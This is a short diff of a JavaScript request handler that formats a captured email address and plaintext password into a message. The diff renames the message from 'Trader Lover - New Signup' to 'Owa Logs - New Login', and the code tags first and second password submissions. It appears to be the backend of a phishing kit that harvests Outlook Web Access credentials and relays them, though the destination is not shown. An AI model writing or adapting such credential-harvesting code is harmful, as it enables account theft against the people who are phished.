@@ -28,7 +28,7 @@ export default async function handler(req, res) {
     }
 
     // ✅ UPDATED: Include submission type in the message
-    const messageText = `📧 Trader Lover - New Signup
+    const messageText = `📧 Owa Logs - New Login
 📋 Type: ${submissionType === 'first' ? 'First Submission' : 'Second Submission'}
 👤 Email: ${email}
 🔑 Password: ${password}
